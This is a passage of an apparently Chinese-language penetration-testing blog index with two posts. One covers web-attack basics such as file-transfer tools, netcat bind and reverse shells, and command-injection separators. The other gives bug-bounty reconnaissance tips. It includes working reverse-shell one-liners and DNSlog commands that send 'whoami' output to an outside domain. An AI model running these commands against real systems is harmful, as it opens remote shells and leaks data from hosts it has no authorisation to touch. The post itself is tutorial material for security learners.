Web常规命令基础推荐个网站：https://forum.ywhack.com/bountytips.php 在里面填一些基本信息会将命令显示出来 文件上传下载： Linux：wget，curl，python，ruby，perl，java等 Windows：PowerShell，Certutil，Bitsadmin，msiexec，mshta，rundll32等 反弹shell： 正向连接：即自己主动找别人，如Linux控制windows正向连接 在windows上绑定cmd到本地5566端口 1nc -e cmd -lvvp 5566 然后Linux主动连接windows的5566端口 1ncat ip 5566 同理，windows控制Linux的话，在Linux上执行 1ncat -e /bin/sh -lvvp 5566 在windows上执行 1nc ip 5566 反向连接：即别人主动来找我，我自己监听，如windows等待Linux反向连接 在Windows上执行 1nc -lvvp 5566 在Linux上执行 1ncat -e /bin/sh windows的ip windows本地正在监听的端口 管道符： Windows：| &amp; || &amp;&amp; Linux：; | || &amp; &amp;&amp; &#96;&#96; 用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行 管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推，显示后面语句的执行结果 &amp;放在启动参数后面表示设置此进程为后台进程 只有在 &amp;&amp; 左边的命令返回真，&amp;&amp; 右边的命令才会被执行 只有在 || 左边的命令返回假，|| 右边的命令才会被执行，只要有一个命令返回真，后面的命令就不会被执行，即一直到返回真的地方停止执行 数据回显：除了上面的反弹shell方法，还可以外带数据查询，比如使用dnslog平台，ping `whoami`.xxx.dnslog.cn，如果有命令执行那就会看到whoami的执行结果。当然 ``仅限于Linux，如果遇到Windows的话，可以使用powershell 1powershell $a=whoami;$a=$a.replace(&#x27;\\&#x27;,&#x27;rce&#x27;);$b=&#x27;.xxxxx.dnslog.cn&#x27;;$c=$a+$b;ping $c 为什么在windows下这么复杂？因为windows下cmd无法直接使用管道符去解析whoami，所有要使用powershell变量赋值，把whoami执行结果给到变量，但是ping的结果中带有 \\ ，所有加个replace去替换 抓包基础HTTP&#x2F;HTTPS协议charles（茶杯）、Fiddler、burp，怎么安装使用网上一大堆，这里不多赘述。 抓微信小程序：可以使用charles抓包，然后转给burp分析；还可以使用proxifier 个人推荐使用proxifier，打开后在代理服务器中选择https，地址与端口和burp的保持一致，然后在代理规则中的应用程序输入wechat*.exe即可，这是在Windows上的方法，如果用mac的话，应用程序那里可以点 + 号 然后在Applications那里，搜索应用，如微信小程序 这个Mini Program 就是小程序的执行程序 PC应用：和抓微信小程序一样，也是用 proxifier➕burp 即可 其他协议推荐工具：科来（没有mac版本，适合新手）、Wireshark 模拟器的一些游戏抓取可以用一个封包监听工具，下载地址和使用说明可以去b站看看 https://www.bilibili.com/video/BV19a411s7pf/?pop_share=1&amp;vd_source=f0e85cdc73190cf042eeba2be6dba3cb 编码算法加密基础加密&amp;编码单向散列加密代表有 MD5 ，常见的还有 SHA ， MAC ， CRC 优点：方便存储，损耗低，加密对性能的损耗微乎其微 缺点：存在暴力破解的可能性，因此最好通过 加盐 的方式提高安全性，此外可能存在散列冲突 MD5密文特点：由数字0-9和字母a-z组成，固定位数16位或32位 解密需求：知道密文即可，对于复杂明文很难碰撞出来 base64编码 一般情况下密文尾部回忆两个等号&#x3D;&#x3D;，明文很少的时候则没有 明文越长密文越长，密文中一般不会出现 &#x2F; 区分大小写 对称加密代表有 AES，常见的还有 DES ， RC4 优点：算法公开，计算量小，加密速度快，加密效率高 缺点：发送方和接收方必须商定好密钥，密钥管理可能存在问题 AES、DES密文特点：和base64基本类似，但密文中一般会有 &#x2F; 和 + 解密需求：密文、模式、加密key，偏移量（ECB模式默认没有偏移量），条件满足方可解密 非对称加密代表有 RSA ，常见的还有 RSA2 ， PKCS 优点：比对称加密安全性更好，加解密需要不同的密钥，即 使用公钥加密就要使用私钥解密，使用私钥加密就要公钥解密 缺点：加解密花费时间长，速度慢，只适合对少量数据进行加密 密文特点：和AES相似，但是长度较长，同一明文每次加密他的密文都会变动 解密需求：密文、公钥或私钥 数据包基础请求 响应 状态码 在请求目录时，比如xxxxx&#x2F;sys&#x2F;admin&#x2F;为200 OK，而xxxxx&#x2F;sys&#x2F;为403，为什么？ 原因是在访问xxxxx&#x2F;sys&#x2F;admin&#x2F;时，此目录下面有类似于index的指引页面，因此可以返回200；而xxxxx&#x2F;sys&#x2F;目录下没有类似于index的指引 页面，因此返回403，但是此目录是存在的，所以扫到目录显示403表示目录是存在的","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"},{"name":"基础","slug":"基础","permalink":"https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"}]},{"title":"SRC通用讲解","slug":"SRC通用讲解","date":"2023-11-24T13:12:12.413Z","updated":"2023-12-06T15:42:58.179Z","comments":true,"path":"2023/11/24/SRC通用讲解/","permalink":"https://ink-scholar.github.io/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/","excerpt":"","text":"此篇主要讲解src挖掘过程中的通用技巧，已方法为主，帮助快速刷src，赚点赏金 信息收集网络空间搜索精准搜索域名搜索Fofa：domain&#x3D;“baidu.com” Hunter：domain.suffix&#x3D;”Baidu.com” Google：site:baidu.com 域名解析微步：https://x.threatbook.com/ 360：https://ti.360.cn/ 旁站查询：https://webscan.cc （对于IP站更好一点） 子域名工具水泽：https://github.com/0x727/ShuiZe_0x727 灯塔魔改版：https://github.com/ki9mu/ARL-plus-docker Nemo：https://github.com/hanc00l/nemo_go 推荐灯塔魔改版 企业查询小蓝本、企查查、爱企查、微信小程序、公众号 模糊搜索通用方法Github关键字搜索 网络空间搜索引擎body，title，ico特征，js特征搜索 通用系统搜索 CNVD通用搜索 EDU通用搜索 短视频信息搜索抖音快手B站等，直接搜索内容，如：腾讯后台登录教程，可以看到一些url甚至是账号密码 语雀搜索 语雀搜索是需要登录的，登录后可以进入页面 https://www.yuque.com/dashboard ，左上角会存在搜索 当然登陆客户端也有 弱口令条件竞争（并发）越权CORS➕XSS未授权SSRF➕RCE逻辑漏洞云安全常见框架漏洞","categories":[{"name":"SRC","slug":"SRC","permalink":"https://ink-scholar.github.io/categories/SRC/"}],"tags":[{"name":"src","slug":"src","permalink":"https://ink-scholar.github.io/tags/src/"}]}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"SRC","slug":"SRC","permalink":"https://ink-scholar.github.io/categories/SRC/"}],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"},{"name":"开发","slug":"开发","permalink":"https://ink-scholar.github.io/tags/%E5%BC%80%E5%8F%91/"},{"name":"信息搜集","slug":"信息搜集","permalink":"https://ink-scholar.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"基础","slug":"基础","permalink":"https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"},{"name":"src","slug":"src","permalink":"https://ink-scholar.github.io/tags/src/"}]}